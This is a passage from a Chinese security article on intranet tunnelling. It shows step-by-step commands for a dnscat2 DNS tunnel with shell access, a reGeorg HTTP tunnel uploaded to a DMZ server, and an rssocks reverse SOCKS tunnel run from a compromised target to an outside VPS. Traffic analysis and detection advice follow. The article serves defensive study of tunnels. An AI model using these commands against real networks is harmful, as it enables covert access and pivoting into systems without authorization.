记录的域名。
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 9/20
2020/7/27 内⽹穿透从搭建到溯源
对NS记录mail⼦域进⾏解析指向ns1*.club的A记录 测试部署： 测试外部对mail
⼦域的dns请求，然后查看vps是否处理该请求。
客户端发送dns请求数据包：
vps对请求数据的处理：
1 tcpdump -n -i eth0 udp dst port 53
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 10/20
2020/7/27 内⽹穿透从搭建到溯源
安装dnscat2服务端 server端： 需要ruby环境 安装gem、ruby、dnscat2服务
端
1 yum install gem
2 rm /usr/bin/ruby
3 wget https://cache.ruby-lang.org/pub/ruby/2.5/ruby-2.5.0.tar.gz
4 tar -zxvf ruby-2.5.0.tar.gz
5 cd ruby-2.5.0
6 mkdir -p /usr/local/ruby
7 ./configure --prefix=/usr/local/ruby
8 make && make install
9 ln -s /usr/local/ruby/bin/ruby /usr/bin/ruby
10
11
12 git clone https://github.com/iagox86/dnscat2.git
13 cd /server
14 gem install bunlder
15 ln /usr/local/ruby/bin/bunlder /usr/bin/bunlder
16 bunlder install
启动服务端：
1 ruby dnscat2.rb mail.****.club -e open -c password --no-cache
客户端下载地址 ：
1 https://downloads.skullsecurity.org/dnscat2/
powershell客户端：
1 `https://codeload.github.com/lukebaggett/dnscat2-powershell/zip/master`
测试通信：
1 ./ruby --ping mail.target.com
连接服务端：
1 ./dnscat --secret=password mail.target.com
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 11/20
2020/7/27 内⽹穿透从搭建到溯源
以下显示连接成功。
server端
sessions显示已经有客户端会话：
1 session -i session_id
进⼊会话，执⾏shell交互命令⾏。
通过监听53端⼝的流量包发现⼤量的dns请求数据。
1 tcpdump -n -i eth0 udp dst port 53
dns隧道分析
通过流量监测，我们可轻易判断出存在⼤量的DNS协议的数据包，同时该数据包与普通
的dns请求完全不同，⾸先是请求的dns域名前存在⼀段加密的字符串，其次dns记录分
布于TXT记录、MX记录和CNAME记录。
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 12/20
2020/7/27 内⽹穿透从搭建到溯源
从以下服务端的tcpdump监测的⽇志也可明显看出与普通dns请求的区别。
因此我们可以从以下⼏⽅⾯进⾏防御：
设置受信任的DNS服务器进⾏通信
阻⽌传⼊和传出的TXT请求
对频繁进⾏DNS请求的设备进⾏禁⽤并发出警告
http隧道搭建
HTTP协议是互联⽹上常⽤的通信协议之⼀。它有很多的应⽤，但最流⾏的就是⽤于
Web浏览器和Web服务器之间的通信，即Web应⽤。通过HTTP服务搭建代理，通常⽤
于将外部流量转⼊内⽹中，常⽤的⼯具有reGeorg、tunna等。以下通过reGeorg进⾏
测试。
dmz:192.168.157.148/192.168.247.130
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 13/20
2020/7/27 内⽹穿透从搭建到溯源
attack:192.168.157.147
victim:192.168.247.152
reGeorg可以⽀持PHP、ASPX、JSP等脚本语⾔，我们需要将脚本上传⾄⽬标服务器
中，
我们通过上传tunnel⽂件到dmz服务器上：
然后搭建基于该⽂件搭建socks5隧道：
说明隧道搭建成功，此时进⾏配置proxifier。
搭建到本地代理的8888端⼝：
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 14/20
2020/7/27 内⽹穿透从搭建到溯源
并配置mstsc流量从该代理发出：
接下来我们看到可以成功连接victim主机。
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 15/20
2020/7/27 内⽹穿透从搭建到溯源
http隧道分析
⾸先通过查看抓取的数据流量，我们发现存在http请求，并且请求中包括有cmd、
target和port三个参数。
然后查看该数据包，在数据包中看到请求的源IP端⼝及⽬的IP端⼝，显然请求参数中IP
端⼝和该数据包的IP端⼝是不⼀样的。
我们通过监听第⼆个⽹卡（192.168.247.130），发现可以看到存在对远程服务器的
3389端⼝链接数据请求，并看到请求的⽬的端⼝的服务名ms-wbt-server。
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 16/20
2020/7/27 内⽹穿透从搭建到溯源
通过以上分析，我们可以针对http协议的数据包进⾏查看，并结合数据包中的ip参数进
⾏溯源，同时针对该ip进⾏检索数据包查看本机ip对该ip的操作内容进⾏多层次的溯
源，同时我们需要结合本机的windows⽇志进⾏配合溯源。
案例
在某次项⽬中，通过灵机⼀动的思路getshell后，由于在菜⼑下的操作⽐较局限，因此
思考可以将流量转出来，在多次尝试后，成功使⽤Rssocks搭建了ssocks隧道，下⾯
简单说⼀下当时的情况：
Rssocks下载地址：
llhttp://sourceforge.net/projects/ssocks/
由于⽬标系统为linux系统，因此需要在ssocks中编译安装ssocks。
./configure && make && make install
⾸先在外⽹的vps上通过执⾏如下命令。
Rcsocks -l 5001 -p 8009 -vv
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 17/20
2020/7/27 内⽹穿透从搭建到溯源
然后在⽬标主机执⾏。
Rssocks -vv -s vpsip:1080
接下来通过proxifier链接socks代理：vpsip：1088
扫描的内⽹某ip端⼝。
此外需要⽤到kali⾥的⼯具proxychains, 修改proxychains配置⽂件。
去掉dynamic_chain注释，在最后⼀⾏加⼊代理,测试内⽹联通性：
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 18/20
2020/7/27 内⽹穿透从搭建到溯源
此时对内⽹的流量操控还是很顺⼿的，看到有10.x.x.16有开放80端⼝服务。
浏览器访问探测出的web服务10.x.x.16。
总结
内⽹穿透的⼯具和技巧有很多，本次基于各层协议介绍了具有代表性的搭建隧道⽅法，
不过原理⼤都相似，重点在于项⽬中遇到各种复杂的环境时，能快速判断到可⽤的隧道
类型，并能克服环境中的坑位；同时希望本⽂能帮助项⽬中的防守⼈员从溯源维度更好
的掌握内⽹穿透技术。
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 19/20
2020/7/27 内⽹穿透从搭建到溯源
https://mp.weixin.qq.com/s/yccot8vJw9yNLOrwUshkLQ 20/20